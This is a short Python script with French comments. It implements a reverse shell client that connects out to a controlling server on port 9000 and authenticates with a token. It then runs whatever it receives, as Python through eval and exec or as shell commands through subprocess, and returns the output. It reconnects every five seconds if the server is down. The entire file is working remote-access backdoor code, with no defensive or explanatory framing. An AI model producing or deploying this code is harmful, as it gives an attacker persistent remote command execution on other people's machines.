import socket
import subprocess
import platform
import traceback

SERVER_IP = "0.0.0.0"  # Remplace par ton serveur la machine qui controle
PORT = 9000
TOKEN = "SECRET_TOKEN"

os_name = platform.system().lower()
globals_py = {}

def run_python(line):
    try:
        result = eval(line, globals_py)
        return "" if result is None else str(result)
    except SyntaxError:
        try:
            exec(line, globals_py)
            return ""
        except Exception:
            return traceback.format_exc()
    except Exception:
        return traceback.format_exc()

def run_shell(cmd):
    try:
        if "windows" in os_name:
            p = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        else:
            p = subprocess.run(cmd, shell=True,
                               executable="/bin/zsh" if os_name=="darwin" else "/bin/bash",
                               capture_output=True, text=True)
        return p.stdout + p.stderr
    except Exception:
        return traceback.format_exc()

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((SERVER_IP, PORT))
            s.send(TOKEN.encode())

            mode = s.recv(1024).decode()  # py ou cmd

            while True:
                try:
                    data = s.recv(8192).decode()
                    if data == "exit":
                        break

                    if mode == "py":
                        out = run_python(data)
                    else:
                        out = run_shell(data)

                    # si sortie vide, renvoyer un \n pour éviter blocage
                    s.send((out if out else "\n").encode())

                except Exception as e:
                    # capture toutes les erreurs côté client
                    s.send(f"ERREUR CLIENT: {e}\n".encode())
    except Exception:
        # reconnecte après 5 sec si serveur indisponible
        import time
        time.sleep(5)

